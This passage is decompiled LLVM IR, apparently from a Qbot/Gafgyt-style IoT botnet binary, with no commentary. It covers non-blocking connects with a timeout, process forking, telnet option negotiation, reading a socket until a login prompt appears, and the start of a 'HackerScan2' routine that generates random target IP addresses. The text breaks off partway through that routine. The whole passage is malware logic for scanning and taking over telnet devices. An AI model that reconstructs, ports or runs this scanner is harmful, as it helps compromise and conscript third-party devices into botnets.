dec_label_pc_9df4:                                ; preds = %dec_label_pc_9db0, %dec_label_pc_9d68, %dec_label_pc_9dec
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_9d68 ], [ 1, %dec_label_pc_9dec ], [ 0, %dec_label_pc_9db0 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9df4, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e10 = load i32, i32* @fp, align 4
  store i32 %v3_9e10, i32* %stack_var_-16, align 4
  %v13_9e10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9e38 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9e48 = or i32 %v2_9e38, 2048
  store i32 %v1_9e48, i32* @r3, align 4
  store i32 %v1_9e48, i32* @r2, align 4
  %v2_9e5c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e70 = urem i32 %arg3, 65536
  %v1_9e78 = call i32 @__GI_htons(i32 %v3_9e70)
  %v3_9e98 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9ea0 = icmp eq i32 %v3_9e98, 0
  br i1 %v2_9ea0, label %dec_label_pc_9eb4, label %dec_label_pc_9ea8

dec_label_pc_9ea8:                                ; preds = %entry
  br label %dec_label_pc_a06c

dec_label_pc_9eb4:                                ; preds = %entry
  %v3_9ec8 = bitcast i32* %stack_var_-40 to i8*
  %v4_9ec8 = call i32 @__GI_memset(i8* %v3_9ec8, i32 0, i32 8)
  %v2_9ecc = ptrtoint i32* %stack_var_-48 to i32
  %v3_9edc = call i32 @__libc_connect(i32 %arg1, i32 %v2_9ecc, i32 16)
  store i32 %v3_9edc, i32* @r3, align 4
  %v1_9eec = icmp slt i32 %v3_9edc, 0
  br i1 %v1_9eec, label %dec_label_pc_9ef4, label %dec_label_pc_a030

dec_label_pc_9ef4:                                ; preds = %dec_label_pc_9eb4
  %v0_9ef4 = call i32 @__GI___errno_location()
  %v1_9efc = inttoptr i32 %v0_9ef4 to i32*
  %v2_9efc = load i32, i32* %v1_9efc, align 4
  %v7_9f00 = icmp eq i32 %v2_9efc, 115
  br i1 %v7_9f00, label %dec_label_pc_9f2c.lr.ph, label %dec_label_pc_a024

dec_label_pc_9f2c.lr.ph:                          ; preds = %dec_label_pc_9ef4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f18 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f2c

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_9f2c.lr.ph, %dec_label_pc_9f2c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f2c.lr.ph ], [ %v1_9f40, %dec_label_pc_9f2c ]
  %v5_9f38 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f38 = add i32 %v5_9f38, %v2_9f18
  %v7_9f38 = inttoptr i32 %v6_9f38 to i32*
  store i32 0, i32* %v7_9f38, align 4
  %v1_9f40 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f40, 32
  br i1 %tmp28, label %dec_label_pc_9f2c, label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_9f2c
  %v3_9f58 = udiv i32 %arg1, 32
  %v3_9f64 = mul nuw nsw i32 %v3_9f58, 4
  %v2_9f6c = add nsw i32 %v3_9f64, -160
  %v2_9f70 = add i32 %v2_9f6c, %v13_9e10
  %v1_9f74 = inttoptr i32 %v2_9f70 to i32*
  %v2_9f74 = load i32, i32* %v1_9f74, align 4
  %v1_9f7c = urem i32 %arg1, 32
  %v6_9f84 = shl i32 1, %v1_9f7c
  %v2_9f88 = or i32 %v2_9f74, %v6_9f84
  store i32 %v2_9f88, i32* %v1_9f74, align 4
  %v1_9fa8 = add i32 %arg1, 1
  %v2_9fb0 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9fc8 = call i32 @__libc_select(i32 %v1_9fa8, i32 0, i32 %v2_9f18, i32 0, i32 %v2_9fb0)
  %tmp29 = icmp slt i32 %v5_9fc8, 1
  br i1 %tmp29, label %dec_label_pc_a018, label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9f54
  store i32 4, i32* %stack_var_-188, align 4
  %v2_9fe0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_9fe4 = ptrtoint i32* %stack_var_-188 to i32
  %v5_9ffc = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_9fe0, i32 %v2_9fe4)
  %v3_a000 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a000, i32* @r3, align 4
  %v2_a004 = icmp eq i32 %v3_a000, 0
  br i1 %v2_a004, label %dec_label_pc_a030, label %dec_label_pc_a00c

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9fd8
  br label %dec_label_pc_a06c

dec_label_pc_a018:                                ; preds = %dec_label_pc_9f54
  br label %dec_label_pc_a06c

dec_label_pc_a024:                                ; preds = %dec_label_pc_9ef4
  br label %dec_label_pc_a06c

dec_label_pc_a030:                                ; preds = %dec_label_pc_9eb4, %dec_label_pc_9fd8
  store i32 0, i32* @r2, align 4
  %v2_a03c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a04c = and i32 %v2_a03c, -2049
  store i32 %v1_a04c, i32* @r3, align 4
  store i32 %v1_a04c, i32* @r2, align 4
  %v2_a060 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a06c

dec_label_pc_a06c:                                ; preds = %dec_label_pc_a024, %dec_label_pc_a018, %dec_label_pc_a00c, %dec_label_pc_9ea8, %dec_label_pc_a030
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a018 ], [ 1, %dec_label_pc_a030 ], [ 0, %dec_label_pc_a00c ], [ 0, %dec_label_pc_a024 ], [ 0, %dec_label_pc_9ea8 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f18, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a06c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a030, { 1, 0 }
  uselistorder label %dec_label_pc_9f2c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a084 = load i32, i32* @r4, align 4
  %v6_a084 = load i32, i32* @r5, align 4
  %v9_a084 = load i32, i32* @r6, align 4
  %v12_a084 = load i32, i32* @fp, align 4
  store i32 41100, i32* %stack_var_-4, align 4
  %v2_a088 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a088, i32* @fp, align 4
  %v0_a090 = call i32 @__libc_fork()
  %v2_a0a0 = icmp eq i32 %v0_a090, 0
  br i1 %v2_a0a0, label %dec_label_pc_a20c, label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %entry
  %v2_a0b8 = load i32, i32* @global_var_324d0.65, align 4
  %v5_a0b8 = load i32, i32* @global_var_324d4.66, align 4
  %v2_a0c4 = add i32 %v2_a0b8, 1
  %v3_a0c4 = icmp eq i32 %v2_a0c4, 0
  %v4_a0c8 = zext i1 %v3_a0c4 to i32
  %v5_a0c8 = add i32 %v4_a0c8, %v5_a0b8
  store i32 %v2_a0c4, i32* @global_var_324d0.65, align 4
  store i32 %v5_a0c8, i32* @global_var_324d4.66, align 4
  %v2_a0e4 = add i32 %v2_a0b8, 2
  %v3_a0e4 = icmp eq i32 %v2_a0c4, -1
  %v4_a0e8 = zext i1 %v3_a0e4 to i32
  %v5_a0e8 = add i32 %v5_a0c8, %v4_a0e8
  %v3_a0ec = udiv i32 %v2_a0e4, 1073741824
  %v3_a0f0 = mul i32 %v5_a0e8, 4
  %v2_a0f4 = or i32 %v3_a0f0, %v3_a0ec
  store i32 %v2_a0f4, i32* @r4, align 4
  %v3_a0f8 = mul i32 %v2_a0e4, 4
  %v1_a100 = call i32 @malloc(i32 %v3_a0f8)
  br label %dec_label_pc_a158

dec_label_pc_a118:                                ; preds = %dec_label_pc_a158, %dec_label_pc_a1a4
  %v3_a11c = mul i32 %storemerge2, 4
  %v2_a128 = add i32 %v3_a11c, %v1_a100
  %v2_a13c = load i32, i32* @global_var_391f4.68, align 4
  %v2_a140 = add i32 %v2_a13c, %v3_a11c
  %v1_a144 = inttoptr i32 %v2_a140 to i32*
  %v2_a144 = load i32, i32* %v1_a144, align 4
  %v2_a148 = inttoptr i32 %v2_a128 to i32*
  store i32 %v2_a144, i32* %v2_a148, align 4
  %v1_a150 = add i32 %storemerge2, 1
  br label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a0b4, %dec_label_pc_a118
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a0b4 ], [ %v1_a150, %dec_label_pc_a118 ]
  %v2_a170 = load i32, i32* @global_var_324d0.65, align 4
  %v5_a170 = load i32, i32* @global_var_324d4.66, align 4
  %v2_a184 = add i32 %v2_a170, -1
  %v3_a184 = icmp ne i32 %v2_a170, 0
  %v3_a188 = add i32 %v5_a170, -1
  %v5_a188 = sext i1 %v3_a184 to i32
  %v9_a19c = icmp eq i32 %v3_a188, %v5_a188
  br i1 %v9_a19c, label %dec_label_pc_a1a4, label %dec_label_pc_a118

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a158
  store i32 %v2_a184, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a184, %storemerge2
  br i1 %tmp, label %dec_label_pc_a118, label %dec_label_pc_a1c4

dec_label_pc_a1c4:                                ; preds = %dec_label_pc_a1a4
  store i32 %v5_a170, i32* @r4, align 4
  %v3_a1cc = mul i32 %v2_a170, 4
  %v1_a1d0 = add i32 %v1_a100, -4
  %v2_a1dc = add i32 %v1_a1d0, %v3_a1cc
  %v2_a1e4 = inttoptr i32 %v2_a1dc to i32*
  store i32 %v0_a090, i32* %v2_a1e4, align 4
  %v2_a1ec = load i32, i32* @global_var_391f4.68, align 4
  store i32 %v2_a1ec, i32* @r0, align 4
  %v0_a1f4 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_391f4.68 to i32), i32* @r2, align 4
  store i32 %v1_a100, i32* @global_var_391f4.68, align 4
  br label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %entry, %dec_label_pc_a1c4
  store i32 %v3_a084, i32* @r4, align 4
  store i32 %v6_a084, i32* @r5, align 4
  store i32 %v9_a084, i32* @r6, align 4
  store i32 %v12_a084, i32* @fp, align 4
  ret i32 %v0_a090

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a11c, { 1, 0 }
  uselistorder i32 %v1_a100, { 2, 0, 1 }
  uselistorder i32 %v2_a0c4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a20c, { 1, 0 }
  uselistorder label %dec_label_pc_a158, { 1, 0 }
  uselistorder label %dec_label_pc_a118, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a248 = add i32 %arg2, 1
  %v1_a24c = inttoptr i32 %v1_a248 to i8*
  %v2_a24c = load i8, i8* %v1_a24c, align 1
  %v7_a258 = icmp ult i8 %v2_a24c, -5
  br i1 %v7_a258, label %dec_label_pc_a3a4, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %entry
  %v7_a268 = icmp eq i8 %v2_a24c, -1
  br i1 %v7_a268, label %dec_label_pc_a26c, label %dec_label_pc_a288

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a260
  br label %dec_label_pc_a3a4

dec_label_pc_a288:                                ; preds = %dec_label_pc_a260
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a290 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a2a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_a290, i32 1, i32 16384)
  %v2_a2b0 = load i8, i8* %v1_a24c, align 1
  %v7_a2b4 = icmp eq i8 %v2_a2b0, -4
  br i1 %v7_a2b4, label %dec_label_pc_a2bc, label %dec_label_pc_a2c8

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a288
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a368

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a288
  %v2_a2d0 = load i8, i8* %v1_a24c, align 1
  %v7_a2d4 = icmp eq i8 %v2_a2d0, -2
  br i1 %v7_a2d4, label %dec_label_pc_a2dc, label %dec_label_pc_a2e8

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a2c8
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a368

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a2c8
  %v2_a2f0 = load i8, i8* %v1_a24c, align 1
  %v7_a2f4 = icmp eq i8 %v2_a2f0, 3
  %v7_a308 = icmp eq i8 %v2_a2f0, -3
  br i1 %v7_a2f4, label %dec_label_pc_a2fc, label %dec_label_pc_a334

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2e8
  br i1 %v7_a308, label %dec_label_pc_a310, label %dec_label_pc_a31c

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2fc
  br label %dec_label_pc_a324

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a2fc
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a31c
  %storemerge = phi i8 [ -3, %dec_label_pc_a31c ], [ -5, %dec_label_pc_a310 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a368

dec_label_pc_a334:                                ; preds = %dec_label_pc_a2e8
  br i1 %v7_a308, label %dec_label_pc_a348, label %dec_label_pc_a354

dec_label_pc_a348:                                ; preds = %dec_label_pc_a334
  br label %dec_label_pc_a35c

dec_label_pc_a354:                                ; preds = %dec_label_pc_a334
  br label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a348, %dec_label_pc_a354
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a354 ], [ -4, %dec_label_pc_a348 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a324, %dec_label_pc_a2dc, %dec_label_pc_a2bc, %dec_label_pc_a35c
  %v4_a37c = call i32 @__libc_send(i32 %arg1, i32 %v2_a290, i32 1, i32 16384)
  %v1_a384 = add i32 %arg2, 2
  %v4_a398 = call i32 @__libc_send(i32 %arg1, i32 %v1_a384, i32 1, i32 16384)
  br label %dec_label_pc_a3a4

dec_label_pc_a3a4:                                ; preds = %dec_label_pc_a26c, %dec_label_pc_a368, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a3a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a368, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a35c, { 1, 0 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a3d8 = call i32 @strlen(i8* %arg1)
  %v2_a420 = add i32 %v3_a3d8, %tmp
  br label %dec_label_pc_a4f4

dec_label_pc_a3f8:                                ; preds = %dec_label_pc_a480, %dec_label_pc_a45c, %dec_label_pc_a438, %dec_label_pc_a414
  %v1_a3fc = add nsw i32 %stack_var_-28.013, 1
  %v7_a410 = icmp sgt i32 %v3_a3d8, %v1_a3fc
  br i1 %v7_a410, label %dec_label_pc_a414, label %dec_label_pc_a4a4

dec_label_pc_a414:                                ; preds = %dec_label_pc_a404.preheader, %dec_label_pc_a3f8
  %stack_var_-28.013 = phi i32 [ %v1_a3fc, %dec_label_pc_a3f8 ], [ %stack_var_-28.1, %dec_label_pc_a404.preheader ]
  %v2_a428 = sub i32 %v2_a420, %stack_var_-28.013
  %v1_a42c = inttoptr i32 %v2_a428 to i8*
  %v2_a42c = load i8, i8* %v1_a42c, align 1
  %v2_a430 = icmp eq i8 %v2_a42c, 0
  br i1 %v2_a430, label %dec_label_pc_a3f8, label %dec_label_pc_a438

dec_label_pc_a438:                                ; preds = %dec_label_pc_a414
  %v2_a450 = load i8, i8* %v1_a42c, align 1
  %v7_a454 = icmp eq i8 %v2_a450, 32
  br i1 %v7_a454, label %dec_label_pc_a3f8, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a438
  %v2_a474 = load i8, i8* %v1_a42c, align 1
  %v7_a478 = icmp eq i8 %v2_a474, 13
  br i1 %v7_a478, label %dec_label_pc_a3f8, label %dec_label_pc_a480

dec_label_pc_a480:                                ; preds = %dec_label_pc_a45c
  %v2_a498 = load i8, i8* %v1_a42c, align 1
  %v7_a49c = icmp eq i8 %v2_a498, 10
  br i1 %v7_a49c, label %dec_label_pc_a3f8, label %dec_label_pc_a4a4

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_a480, %dec_label_pc_a3f8, %dec_label_pc_a404.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a404.preheader ], [ %stack_var_-28.013, %dec_label_pc_a480 ], [ %v1_a3fc, %dec_label_pc_a3f8 ]
  %v2_a4b8 = sub i32 %v2_a420, %stack_var_-28.0.lcssa
  %v1_a4bc = inttoptr i32 %v2_a4b8 to i8*
  %v2_a4bc = load i8, i8* %v1_a4bc, align 1
  %v2_a4cc = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_23aa0.70 to i32)
  %v1_a4d0 = inttoptr i32 %v2_a4cc to i8*
  %v2_a4d0 = load i8, i8* %v1_a4d0, align 1
  %v9_a4d4 = icmp eq i8 %v2_a4bc, %v2_a4d0
  %v1_a4ec = add i32 %storemerge2, 1
  br i1 %v9_a4d4, label %dec_label_pc_a514, label %dec_label_pc_a4f4

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a4a4, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a4a4 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a4ec, %dec_label_pc_a4a4 ]
  %v3_a4fc = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23aa0.70, i32 0, i32 0))
  %v3_a504 = icmp ult i32 %storemerge2, %v3_a4fc
  br i1 %v3_a504, label %dec_label_pc_a404.preheader, label %dec_label_pc_a514

dec_label_pc_a404.preheader:                      ; preds = %dec_label_pc_a4f4
  %v7_a41012 = icmp sgt i32 %v3_a3d8, %stack_var_-28.1
  br i1 %v7_a41012, label %dec_label_pc_a414, label %dec_label_pc_a4a4

dec_label_pc_a514:                                ; preds = %dec_label_pc_a4f4, %dec_label_pc_a4a4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a4a4 ], [ 0, %dec_label_pc_a4f4 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a3d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a4a4, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a530 = load i32, i32* @fp, align 4
  store i32 %v3_a530, i32* %stack_var_-16, align 4
  %v13_a530 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a580 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a5c0 = udiv i32 %arg1, 32
  %v3_a5cc = mul nuw nsw i32 %v3_a5c0, 4
  %v1_a5e4 = urem i32 %arg1, 32
  %v6_a5ec = shl i32 1, %v1_a5e4
  %v1_a610 = add i32 %arg1, 1
  %v2_a618 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a738 = inttoptr i32 %arg2 to i8*
  %v2_a74c = icmp eq i32 %arg3, 0
  %v1_a758 = inttoptr i32 %arg6 to i8*
  %v5_a79c = icmp sgt i32 %arg5, 0
  %v2_a5d4 = add nsw i32 %v3_a5cc, -152
  %v2_a5d8 = add i32 %v2_a5d4, %v13_a530
  %v1_a5dc = inttoptr i32 %v2_a5d8 to i32*
  br label %dec_label_pc_a774

dec_label_pc_a594.lr.ph:                          ; preds = %dec_label_pc_a788, %dec_label_pc_a794
  br label %dec_label_pc_a594

dec_label_pc_a594:                                ; preds = %dec_label_pc_a594.lr.ph, %dec_label_pc_a594
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a594.lr.ph ], [ %v1_a5a8, %dec_label_pc_a594 ]
  %v5_a5a0 = mul nuw nsw i32 %storemerge27, 4
  %v6_a5a0 = add i32 %v5_a5a0, %v2_a580
  %v7_a5a0 = inttoptr i32 %v6_a5a0 to i32*
  store i32 0, i32* %v7_a5a0, align 4
  %v1_a5a8 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a5a8, 32
  br i1 %tmp30, label %dec_label_pc_a594, label %dec_label_pc_a5bc

dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a594
  %v2_a5dc = load i32, i32* %v1_a5dc, align 4
  %v2_a5f0 = or i32 %v2_a5dc, %v6_a5ec
  store i32 %v2_a5f0, i32* %v1_a5dc, align 4
  %v5_a62c = call i32 @__libc_select(i32 %v1_a610, i32 %v2_a580, i32 0, i32 0, i32 %v2_a618)
  %tmp31 = icmp slt i32 %v5_a62c, 1
  br i1 %tmp31, label %dec_label_pc_a7b8, label %dec_label_pc_a63c

dec_label_pc_a63c:                                ; preds = %dec_label_pc_a5bc
  %v2_a648 = add i32 %stack_var_-40.0, %arg6
  %v5_a64c = inttoptr i32 %v2_a648 to i8*
  %v6_a660 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a648, i32 1, i32 0, i32 %v2_a648)
  %v7_a670 = icmp eq i32 %v6_a660, -1
  br i1 %v7_a670, label %dec_label_pc_a684, label %dec_label_pc_a678

dec_label_pc_a678:                                ; preds = %dec_label_pc_a63c
  %v2_a67c = icmp eq i32 %v6_a660, 0
  br i1 %v2_a67c, label %dec_label_pc_a684, label %dec_label_pc_a690

dec_label_pc_a684:                                ; preds = %dec_label_pc_a678, %dec_label_pc_a63c
  br label %dec_label_pc_a7c0

dec_label_pc_a690:                                ; preds = %dec_label_pc_a678
  %v2_a698 = add i32 %v6_a660, %stack_var_-40.0
  %v2_a6a4 = load i8, i8* %v5_a64c, align 1
  %v2_a6a8 = icmp eq i8 %v2_a6a4, -1
  br i1 %v2_a6a8, label %dec_label_pc_a6b0, label %dec_label_pc_a730

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a690
  %v1_a6b4 = add i32 %v2_a648, 1
  %v5_a6c8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a6b4, i32 2, i32 0, i32 %v2_a698)
  %v7_a6d8 = icmp eq i32 %v5_a6c8, -1
  br i1 %v7_a6d8, label %dec_label_pc_a6ec, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6b0
  %v2_a6e4 = icmp eq i32 %v5_a6c8, 0
  br i1 %v2_a6e4, label %dec_label_pc_a6ec, label %dec_label_pc_a6f8

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a6e0, %dec_label_pc_a6b0
  br label %dec_label_pc_a7c0

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6e0
  %v2_a700 = add i32 %v5_a6c8, %v2_a698
  %v3_a714 = call i32 @negotiate(i32 %arg1, i32 %v2_a648, i32 3)
  %v2_a71c = icmp eq i32 %v3_a714, 0
  br i1 %v2_a71c, label %dec_label_pc_a724, label %dec_label_pc_a774

dec_label_pc_a724:                                ; preds = %dec_label_pc_a6f8
  br label %dec_label_pc_a7c0

dec_label_pc_a730:                                ; preds = %dec_label_pc_a690
  %v7_a738 = call i32 @strstr(i32 %arg6, i8* %v6_a738)
  %v2_a740 = icmp eq i32 %v7_a738, 0
  br i1 %v2_a740, label %dec_label_pc_a748, label %dec_label_pc_a7ac

dec_label_pc_a748:                                ; preds = %dec_label_pc_a730
  br i1 %v2_a74c, label %dec_label_pc_a774, label %dec_label_pc_a754

dec_label_pc_a754:                                ; preds = %dec_label_pc_a748
  %v2_a758 = call i32 @matchPrompt(i8* %v1_a758)
  %v2_a760 = icmp eq i32 %v2_a758, 0
  br i1 %v2_a760, label %dec_label_pc_a774, label %dec_label_pc_a7ac

dec_label_pc_a774:                                ; preds = %dec_label_pc_a6f8, %dec_label_pc_a754, %dec_label_pc_a748, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a700, %dec_label_pc_a6f8 ], [ %v2_a698, %dec_label_pc_a748 ], [ %v2_a698, %dec_label_pc_a754 ]
  %v1_a778 = add i32 %stack_var_-40.0, 2
  %v6_a784 = icmp slt i32 %v1_a778, %arg7
  br i1 %v6_a784, label %dec_label_pc_a788, label %dec_label_pc_a7b8

dec_label_pc_a788:                                ; preds = %dec_label_pc_a774
  %v3_a788 = load i32, i32* %stack_var_-176, align 4
  %v5_a790 = icmp sgt i32 %v3_a788, 0
  br i1 %v5_a790, label %dec_label_pc_a594.lr.ph, label %dec_label_pc_a794

dec_label_pc_a794:                                ; preds = %dec_label_pc_a788
  br i1 %v5_a79c, label %dec_label_pc_a594.lr.ph, label %dec_label_pc_a7b8

dec_label_pc_a7ac:                                ; preds = %dec_label_pc_a730, %dec_label_pc_a754
  br label %dec_label_pc_a7c0

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a5bc, %dec_label_pc_a794, %dec_label_pc_a774
  br label %dec_label_pc_a7c0

dec_label_pc_a7c0:                                ; preds = %dec_label_pc_a7ac, %dec_label_pc_a724, %dec_label_pc_a6ec, %dec_label_pc_a684, %dec_label_pc_a7b8
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a7b8 ], [ 1, %dec_label_pc_a7ac ], [ 0, %dec_label_pc_a684 ], [ 0, %dec_label_pc_a6ec ], [ 0, %dec_label_pc_a724 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_a6c8, { 1, 2, 0 }
  uselistorder i32 %v6_a660, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a580, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a7c0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a7b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a7ac, { 1, 0 }
  uselistorder label %dec_label_pc_a774, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a594, { 1, 0 }
  uselistorder label %dec_label_pc_a594.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a7d8 = load i32, i32* @fp, align 4
  store i32 42976, i32* %stack_var_-4, align 4
  %v2_a7dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a7dc, i32* @fp, align 4
  store i8 0, i8* @global_var_324df.73, align 1
  store i8 0, i8* @global_var_324e0.74, align 1
  store i8 0, i8* @global_var_324e1.75, align 1
  store i8 0, i8* @global_var_324e2.76, align 1
  %v0_a814 = call i32 @rand()
  %v2_a830 = sdiv i32 %v0_a814, 51
  %tmp219 = mul i32 %v2_a830, -255
  %v2_a848 = add i32 %tmp219, %v0_a814
  %v1_a85c = trunc i32 %v2_a848 to i8
  store i8 %v1_a85c, i8* @global_var_324df.73, align 1
  %v0_a860 = call i32 @rand()
  %v2_a87c = sdiv i32 %v0_a860, 51
  %tmp220 = mul i32 %v2_a87c, -255
  %v2_a894 = add i32 %tmp220, %v0_a860
  %v1_a8a8 = trunc i32 %v2_a894 to i8
  store i8 %v1_a8a8, i8* @global_var_324e0.74, align 1
  %v0_a8ac = call i32 @rand()
  %v2_a8c8 = sdiv i32 %v0_a8ac, 51
  %tmp221 = mul i32 %v2_a8c8, -255
  %v2_a8e0 = add i32 %tmp221, %v0_a8ac
